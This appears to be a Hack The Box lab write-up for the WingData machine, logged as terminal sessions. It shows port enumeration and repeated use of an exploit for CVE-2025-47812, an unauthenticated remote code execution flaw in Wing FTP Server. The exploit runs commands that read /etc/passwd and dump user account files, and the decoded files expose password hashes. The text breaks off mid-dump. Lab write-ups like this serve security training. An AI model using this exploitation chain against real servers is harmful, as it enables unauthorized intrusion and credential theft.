network enumeration:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

found the subdomain name `ftp.wingdata.htb` by just clicking the button in the `wingdata.htb` , it is a FTP server software powered by Wing FTP Server `v7.4.3`

`CVE-2025-47812 : Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)`

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c pwd

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'pwd' and username: 'anonymous'
[+] UID extracted: d186e30929ff8fb9c3d56209d8f2b25af528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: d186e30929ff8fb9c3d56209d8f2b25af528764d624db129b32c21fbca0cb8d6

--- Command Output ---
/opt/wftpserver
----------------------

ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "cat /etc/passwd"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat /etc/passwd' and username: 'anonymous'
[+] UID extracted: ab61e7e20430f2ca814d63a869eb8e28f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: ab61e7e20430f2ca814d63a869eb8e28f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
_laurel:x:999:996::/var/log/laurel:/bin/false
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "ls"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls' and username: 'anonymous'
[+] UID extracted: 5d3e8695ce36382cb47239e130d1acd6f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 5d3e8695ce36382cb47239e130d1acd6f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "id"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
[+] UID extracted: 3a2e58c9ff28c01e591d7be4bc4af598f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 3a2e58c9ff28c01e591d7be4bc4af598f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "find . -type f -name '*.xml'"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'find . -type f -name '*.xml'' and username: 'anonymous'
[+] UID extracted: f5a686aac538d57235de1053afb72548f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f5a686aac538d57235de1053afb72548f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
./Data/_ADMINISTRATOR/admins.xml
./Data/_ADMINISTRATOR/settings.xml
./Data/1/users/maria.xml
./Data/1/users/steve.xml
./Data/1/users/wacky.xml
./Data/1/users/anonymous.xml
./Data/1/users/john.xml
./Data/1/settings.xml
./Data/1/portlistener.xml
./Data/settings.xml
./webadmin/crossdomain.xml
./webclient/crossdomain.xml
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "ls -la Data/1/users"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Data/1/users' and username: 'anonymous'
[+] UID extracted: f01c084b102c656ca858d59a1f8c7fe4f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f01c084b102c656ca858d59a1f8c7fe4f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 28
drwxr-x--- 2 wingftp wingftp 4096 Feb 14 22:54 .
drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..
-rwxr-x--- 1 wingftp wingftp 2843 Feb 14 22:54 anonymous.xml
-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml
-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "base64 Data/1/users/wacky.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 Data/1/users/wacky.xml' and username: 'anonymous'
[+] UID extracted: e85b8602a65174ba678b17e03d053837f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: e85b8602a65174ba678b17e03d053837f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8VVNFUl9BQ0NPVU5UUyBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIFVzZXIgQWNjb3VudHMiPgogICAgPFVTRVI+CiAgICAgICAgPFVzZXJOYW1lPndh
Y2t5PC9Vc2VyTmFtZT4KICAgICAgICA8RW5hYmxlQWNjb3VudD4xPC9FbmFibGVBY2NvdW50Pgog
ICAgICAgIDxFbmFibGVQYXNzd29yZD4xPC9FbmFibGVQYXNzd29yZD4KICAgICAgICA8UGFzc3dv
cmQ+MzI5NDBkZWZkM2MzZWY3MGEyZGQ0NGE1MzAxZmY5ODRjNDc0MmYwYmFhZTc2ZmY1Yjg3ODM5
OTRmOGE1MDNjYTwvUGFzc3dvcmQ+CiAgICAgICAgPFByb3RvY29sVHlwZT42MzwvUHJvdG9jb2xU
eXBlPgogICAgICAgIDxFbmFibGVFeHBpcmU+MDwvRW5hYmxlRXhwaXJlPgogICAgICAgIDxFeHBp
cmVUaW1lPjIwMjUtMTItMDIgMTI6MDI6NDY8L0V4cGlyZVRpbWU+CiAgICAgICAgPE1heERvd25s
b2FkU3BlZWRQZXJTZXNzaW9uPjA8L01heERvd25sb2FkU3BlZWRQZXJTZXNzaW9uPgogICAgICAg
IDxNYXhVcGxvYWRTcGVlZFBlclNlc3Npb24+MDwvTWF4VXBsb2FkU3BlZWRQZXJTZXNzaW9uPgog
ICAgICAgIDxNYXhEb3dubG9hZFNwZWVkUGVyVXNlcj4wPC9NYXhEb3dubG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8TWF4VXBsb2FkU3BlZWRQZXJVc2VyPjA8L01heFVwbG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8U2Vzc2lvbk5vQ29tbWFuZFRpbWVPdXQ+NTwvU2Vzc2lvbk5vQ29tbWFuZFRp
bWVPdXQ+CiAgICAgICAgPFNlc3Npb25Ob1RyYW5zZmVyVGltZU91dD41PC9TZXNzaW9uTm9UcmFu
c2ZlclRpbWVPdXQ+CiAgICAgICAgPE1heENvbm5lY3Rpb24+MDwvTWF4Q29ubmVjdGlvbj4KICAg
ICAgICA8Q29ubmVjdGlvblBlcklwPjA8L0Nvbm5lY3Rpb25QZXJJcD4KICAgICAgICA8UGFzc3dv
cmRMZW5ndGg+MDwvUGFzc3dvcmRMZW5ndGg+CiAgICAgICAgPFNob3dIaWRkZW5GaWxlPjA8L1No
b3dIaWRkZW5GaWxlPgogICAgICAgIDxDYW5DaGFuZ2VQYXNzd29yZD4wPC9DYW5DaGFuZ2VQYXNz
d29yZD4KICAgICAgICA8Q2FuU2VuZE1lc3NhZ2VUb1NlcnZlcj4wPC9DYW5TZW5kTWVzc2FnZVRv
U2VydmVyPgogICAgICAgIDxFbmFibGVTU0hQdWJsaWNLZXlBdXRoPjA8L0VuYWJsZVNTSFB1Ymxp
Y0tleUF1dGg+CiAgICAgICAgPFNTSFB1YmxpY0tleVBhdGg+PC9TU0hQdWJsaWNLZXlQYXRoPgog
ICAgICAgIDxTU0hBdXRoTWV0aG9kPjA8L1NTSEF1dGhNZXRob2Q+CiAgICAgICAgPEVuYWJsZVdl
Ymxpbms+MTwvRW5hYmxlV2VibGluaz4KICAgICAgICA8RW5hYmxlVXBsaW5rPjE8L0VuYWJsZVVw
bGluaz4KICAgICAgICA8RW5hYmxlVHdvRmFjdG9yPjA8L0VuYWJsZVR3b0ZhY3Rvcj4KICAgICAg
ICA8VHdvRmFjdG9yQ29kZT48L1R3b0ZhY3RvckNvZGU+CiAgICAgICAgPEV4dHJhSW5mbz48L0V4
dHJhSW5mbz4KICAgICAgICA8Q3VycmVudENyZWRpdD4wPC9DdXJyZW50Q3JlZGl0PgogICAgICAg
IDxSYXRpb0Rvd25sb2FkPjE8L1JhdGlvRG93bmxvYWQ+CiAgICAgICAgPFJhdGlvVXBsb2FkPjE8
L1JhdGlvVXBsb2FkPgogICAgICAgIDxSYXRpb0NvdW50TWV0aG9kPjA8L1JhdGlvQ291bnRNZXRo
b2Q+CiAgICAgICAgPEVuYWJsZVJhdGlvPjA8L0VuYWJsZVJhdGlvPgogICAgICAgIDxNYXhRdW90
YT4wPC9NYXhRdW90YT4KICAgICAgICA8Q3VycmVudFF1b3RhPjA8L0N1cnJlbnRRdW90YT4KICAg
ICAgICA8RW5hYmxlUXVvdGE+MDwvRW5hYmxlUXVvdGE+CiAgICAgICAgPE5vdGVzTmFtZT48L05v
dGVzTmFtZT4KICAgICAgICA8Tm90ZXNBZGRyZXNzPjwvTm90ZXNBZGRyZXNzPgogICAgICAgIDxO
b3Rlc1ppcENvZGU+PC9Ob3Rlc1ppcENvZGU+CiAgICAgICAgPE5vdGVzUGhvbmU+PC9Ob3Rlc1Bo
b25lPgogICAgICAgIDxOb3Rlc0ZheD48L05vdGVzRmF4PgogICAgICAgIDxOb3Rlc0VtYWlsPjwv
Tm90ZXNFbWFpbD4KICAgICAgICA8Tm90ZXNNZW1vPjwvTm90ZXNNZW1vPgogICAgICAgIDxFbmFi
bGVVcGxvYWRMaW1pdD4wPC9FbmFibGVVcGxvYWRMaW1pdD4KICAgICAgICA8Q3VyTGltaXRVcGxv
YWRTaXplPjA8L0N1ckxpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8TWF4TGltaXRVcGxvYWRTaXpl
PjA8L01heExpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8RW5hYmxlRG93bmxvYWRMaW1pdD4wPC9F
bmFibGVEb3dubG9hZExpbWl0PgogICAgICAgIDxDdXJMaW1pdERvd25sb2FkTGltaXQ+MDwvQ3Vy
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxNYXhMaW1pdERvd25sb2FkTGltaXQ+MDwvTWF4
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxMaW1pdFJlc2V0VHlwZT4wPC9MaW1pdFJlc2V0
VHlwZT4KICAgICAgICA8TGltaXRSZXNldFRpbWU+MTc2MjEwMzA4OTwvTGltaXRSZXNldFRpbWU+
CiAgICAgICAgPFRvdGFsUmVjZWl2ZWRCeXRlcz4wPC9Ub3RhbFJlY2VpdmVkQnl0ZXM+CiAgICAg
ICAgPFRvdGFsU2VudEJ5dGVzPjA8L1RvdGFsU2VudEJ5dGVzPgogICAgICAgIDxMb2dpbkNvdW50
PjI8L0xvZ2luQ291bnQ+CiAgICAgICAgPEZpbGVEb3dubG9hZD4wPC9GaWxlRG93bmxvYWQ+CiAg
ICAgICAgPEZpbGVVcGxvYWQ+MDwvRmlsZVVwbG9hZD4KICAgICAgICA8RmFpbGVkRG93bmxvYWQ+
MDwvRmFpbGVkRG93bmxvYWQ+CiAgICAgICAgPEZhaWxlZFVwbG9hZD4wPC9GYWlsZWRVcGxvYWQ+
CiAgICAgICAgPExhc3RMb2dpbklwPjEyNy4wLjAuMTwvTGFzdExvZ2luSXA+CiAgICAgICAgPExh
c3RMb2dpblRpbWU+MjAyNS0xMS0wMiAxMjoyODo1MjwvTGFzdExvZ2luVGltZT4KICAgICAgICA8
RW5hYmxlU2NoZWR1bGU+MDwvRW5hYmxlU2NoZWR1bGU+CiAgICA8L1VTRVI+CjwvVVNFUl9BQ0NP
VU5UUz4K
----------------------
```

after encode it output is :

```
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "base64 Data/1/users/john.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 Data/1/users/john.xml' and username: 'anonymous'
[+] UID extracted: 888b84c17980b5b0089295e74424a9f4f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 888b84c17980b5b0089295e74424a9f4f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8VVNFUl9BQ0NPVU5UUyBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIFVzZXIgQWNjb3VudHMiPgogICAgPFVTRVI+CiAgICAgICAgPFVzZXJOYW1lPmpv
aG48L1VzZXJOYW1lPgogICAgICAgIDxFbmFibGVBY2NvdW50PjE8L0VuYWJsZUFjY291bnQ+CiAg
ICAgICAgPEVuYWJsZVBhc3N3b3JkPjE8L0VuYWJsZVBhc3N3b3JkPgogICAgICAgIDxQYXNzd29y
ZD5jMWYxNDY3MmZlZWMzYmJhMjcyMzEwNDgyNzFmY2RjZGRlYjlkNzVlZjc5ZjY4ODkxMzlhYTc4
YzlkMzk4ZjEwPC9QYXNzd29yZD4KICAgICAgICA8UHJvdG9jb2xUeXBlPjYzPC9Qcm90b2NvbFR5
cGU+CiAgICAgICAgPEVuYWJsZUV4cGlyZT4wPC9FbmFibGVFeHBpcmU+CiAgICAgICAgPEV4cGly
ZVRpbWU+MjAyNS0xMi0wMiAxMToxMzowMDwvRXhwaXJlVGltZT4KICAgICAgICA8TWF4RG93bmxv
YWRTcGVlZFBlclNlc3Npb24+MDwvTWF4RG93bmxvYWRTcGVlZFBlclNlc3Npb24+CiAgICAgICAg
PE1heFVwbG9hZFNwZWVkUGVyU2Vzc2lvbj4wPC9NYXhVcGxvYWRTcGVlZFBlclNlc3Npb24+CiAg
ICAgICAgPE1heERvd25sb2FkU3BlZWRQZXJVc2VyPjA8L01heERvd25sb2FkU3BlZWRQZXJVc2Vy
PgogICAgICAgIDxNYXhVcGxvYWRTcGVlZFBlclVzZXI+MDwvTWF4VXBsb2FkU3BlZWRQZXJVc2Vy
PgogICAgICAgIDxTZXNzaW9uTm9Db21tYW5kVGltZU91dD41PC9TZXNzaW9uTm9Db21tYW5kVGlt
ZU91dD4KICAgICAgICA8U2Vzc2lvbk5vVHJhbnNmZXJUaW1lT3V0PjU8L1Nlc3Npb25Ob1RyYW5z
ZmVyVGltZU91dD4KICAgICAgICA8TWF4Q29ubmVjdGlvbj4wPC9NYXhDb25uZWN0aW9uPgogICAg
ICAgIDxDb25uZWN0aW9uUGVySXA+MDwvQ29ubmVjdGlvblBlcklwPgogICAgICAgIDxQYXNzd29y
ZExlbmd0aD4wPC9QYXNzd29yZExlbmd0aD4KICAgICAgICA8U2hvd0hpZGRlbkZpbGU+MDwvU2hv
d0hpZGRlbkZpbGU+CiAgICAgICAgPENhbkNoYW5nZVBhc3N3b3JkPjA8L0NhbkNoYW5nZVBhc3N3
b3JkPgogICAgICAgIDxDYW5TZW5kTWVzc2FnZVRvU2VydmVyPjA8L0NhblNlbmRNZXNzYWdlVG9T
ZXJ2ZXI+CiAgICAgICAgPEVuYWJsZVNTSFB1YmxpY0tleUF1dGg+MDwvRW5hYmxlU1NIUHVibGlj
S2V5QXV0aD4KICAgICAgICA8U1NIUHVibGljS2V5UGF0aD48L1NTSFB1YmxpY0tleVBhdGg+CiAg
ICAgICAgPFNTSEF1dGhNZXRob2Q+MDwvU1NIQXV0aE1ldGhvZD4KICAgICAgICA8RW5hYmxlV2Vi
bGluaz4xPC9FbmFibGVXZWJsaW5rPgogICAgICAgIDxFbmFibGVVcGxpbms+MTwvRW5hYmxlVXBs
aW5rPgogICAgICAgIDxFbmFibGVUd29GYWN0b3I+MDwvRW5hYmxlVHdvRmFjdG9yPgogICAgICAg
IDxUd29GYWN0b3JDb2RlPjwvVHdvRmFjdG9yQ29kZT4KICAgICAgICA8RXh0cmFJbmZvPjwvRXh0
cmFJbmZvPgogICAgICAgIDxDdXJyZW50Q3JlZGl0PjA8L0N1cnJlbnRDcmVkaXQ+CiAgICAgICAg
PFJhdGlvRG93bmxvYWQ+MTwvUmF0aW9Eb3dubG9hZD4KICAgICAgICA8UmF0aW9VcGxvYWQ+MTwv
UmF0aW9VcGxvYWQ+CiAgICAgICAgPFJhdGlvQ291bnRNZXRob2Q+MDwvUmF0aW9Db3VudE1ldGhv
ZD4KICAgICAgICA8RW5hYmxlUmF0aW8+MDwvRW5hYmxlUmF0aW8+CiAgICAgICAgPE1heFF1b3Rh
PjA8L01heFF1b3RhPgogICAgICAgIDxDdXJyZW50UXVvdGE+MDwvQ3VycmVudFF1b3RhPgogICAg
ICAgIDxFbmFibGVRdW90YT4wPC9FbmFibGVRdW90YT4KICAgICAgICA8Tm90ZXNOYW1lPjwvTm90
ZXNOYW1lPgogICAgICAgIDxOb3Rlc0FkZHJlc3M+PC9Ob3Rlc0FkZHJlc3M+CiAgICAgICAgPE5v
dGVzWmlwQ29kZT48L05vdGVzWmlwQ29kZT4KICAgICAgICA8Tm90ZXNQaG9uZT48L05vdGVzUGhv
bmU+CiAgICAgICAgPE5vdGVzRmF4PjwvTm90ZXNGYXg+CiAgICAgICAgPE5vdGVzRW1haWw+PC9O
b3Rlc0VtYWlsPgogICAgICAgIDxOb3Rlc01lbW8+PC9Ob3Rlc01lbW8+CiAgICAgICAgPEVuYWJs
ZVVwbG9hZExpbWl0PjA8L0VuYWJsZVVwbG9hZExpbWl0PgogICAgICAgIDxDdXJMaW1pdFVwbG9h
ZFNpemU+MDwvQ3VyTGltaXRVcGxvYWRTaXplPgogICAgICAgIDxNYXhMaW1pdFVwbG9hZFNpemU+
MDwvTWF4TGltaXRVcGxvYWRTaXplPgogICAgICAgIDxFbmFibGVEb3dubG9hZExpbWl0PjA8L0Vu
YWJsZURvd25sb2FkTGltaXQ+CiAgICAgICAgPEN1ckxpbWl0RG93bmxvYWRMaW1pdD4wPC9DdXJM
aW1pdERvd25sb2FkTGltaXQ+CiAgICAgICAgPE1heExpbWl0RG93bmxvYWRMaW1pdD4wPC9NYXhM
aW1pdERvd25sb2FkTGltaXQ+CiAgICAgICAgPExpbWl0UmVzZXRUeXBlPjA8L0xpbWl0UmVzZXRU
eXBlPgogICAgICAgIDxMaW1pdFJlc2V0VGltZT4xNzYyMDk5OTg1PC9MaW1pdFJlc2V0VGltZT4K
ICAgICAgICA8VG90YWxSZWNlaXZlZEJ5dGVzPjA8L1RvdGFsUmVjZWl2ZWRCeXRlcz4KICAgICAg
ICA8VG90YWxTZW50Qnl0ZXM+MDwvVG90YWxTZW50Qnl0ZXM+CiAgICAgICAgPExvZ2luQ291bnQ+
MDwvTG9naW5Db3VudD4KICAgICAgICA8RmlsZURvd25sb2FkPjA8L0ZpbGVEb3dubG9hZD4KICAg
ICAgICA8RmlsZVVwbG9hZD4wPC9GaWxlVXBsb2FkPgogICAgICAgIDxGYWlsZWREb3dubG9hZD4w
PC9GYWlsZWREb3dubG9hZD4KICAgICAgICA8RmFpbGVkVXBsb2FkPjA8L0ZhaWxlZFVwbG9hZD4K
ICAgICAgICA8TGFzdExvZ2luSXA+PC9MYXN0TG9naW5JcD4KICAgICAgICA8TGFzdExvZ2luVGlt
ZT4yMDI1LTExLTAyIDExOjEzOjA1PC9MYXN0TG9naW5UaW1lPgogICAgICAgIDxFbmFibGVTY2hl
ZHVsZT4wPC9FbmFibGVTY2hlZHVsZT4KICAgIDwvVVNFUj4KPC9VU0VSX0FDQ09VTlRTPgo=
----------------------
```

```
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>john</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 11:13:00</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762099985</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>0</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp></LastLoginIp>
        <LastLoginTime>2025-11-02 11:13:05</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "base64 Data/1/users/maria.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 Data/1/users/maria.xml' and username: 'anonymous'
[+] UID extracted: ce91eb03809f46c3c24afc57c9027de6f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: ce91eb03809f46c3c24afc57c9027de6f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8VVNFUl9BQ0NPVU5UUyBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIFVzZXIgQWNjb3VudHMiPgogICAgPFVTRVI+CiAgICAgICAgPFVzZXJOYW1lPm1h
cmlhPC9Vc2VyTmFtZT4KICAgICAgICA8RW5hYmxlQWNjb3VudD4xPC9FbmFibGVBY2NvdW50Pgog
ICAgICAgIDxFbmFibGVQYXNzd29yZD4xPC9FbmFibGVQYXNzd29yZD4KICAgICAgICA8UGFzc3dv
cmQ+YTcwMjIxZjMzYTUxZGNhNzZkZmQ0NmMxN2FiMTcxMTZhOTc4MjNjYWY0MGFlZWNmYmM2MTFj
